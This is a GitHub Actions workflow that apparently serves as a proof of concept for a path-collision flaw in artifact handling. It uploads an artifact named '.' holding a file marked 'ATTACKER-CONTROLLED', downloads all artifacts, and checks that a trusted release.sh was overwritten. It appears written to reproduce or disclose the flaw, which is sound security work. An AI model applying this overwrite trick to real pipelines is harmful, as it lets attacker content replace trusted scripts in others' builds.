name: actions artifact dot overwrite validation

run-name: actions artifact dot overwrite validation ${{ github.run_id }}

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read
  actions: read

jobs:
  validate-dot-artifact-overwrite:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare payload files
        run: |
          set -euo pipefail
          rm -rf payload-dot payload-safe sandbox
          mkdir -p payload-dot payload-safe sandbox/inner
          printf 'ATTACKER-CONTROLLED-%s\n' "$GITHUB_RUN_ID" > payload-dot/release.sh
          printf 'safe-%s\n' "$GITHUB_RUN_ID" > payload-safe/safe.txt
          printf 'TRUSTED-BEFORE-DOWNLOAD\n' > sandbox/inner/release.sh
          chmod +x sandbox/inner/release.sh
          echo '--- before download ---'
          sed -n '1p' sandbox/inner/release.sh

      - name: Upload crafted dot artifact containing colliding root file
        uses: actions/upload-artifact@v7.0.1
        with:
          name: .
          path: payload-dot/release.sh
          retention-days: 1

      - name: Upload second artifact to force multi-artifact mode
        uses: actions/upload-artifact@v7.0.1
        with:
          name: safe-artifact
          path: payload-safe/safe.txt
          retention-days: 1

      - name: Download all artifacts into a directory that already has a trusted file
        uses: actions/download-artifact@v8.0.1
        with:
          path: sandbox/inner

      - name: Validate trusted root file was overwritten by dot artifact
        run: |
          set -euo pipefail
          echo '--- filesystem result ---'
          find sandbox -maxdepth 4 -type f -print -exec sed -n '1p' {} \;
          echo '--- overwritten file content ---'
          sed -n '1p' sandbox/inner/release.sh
          echo '--- assertions ---'
          grep -q "ATTACKER-CONTROLLED-$GITHUB_RUN_ID" sandbox/inner/release.sh
          test -f sandbox/inner/safe-artifact/safe.txt
          echo 'dot artifact overwrote a pre-existing trusted file in the requested download root'
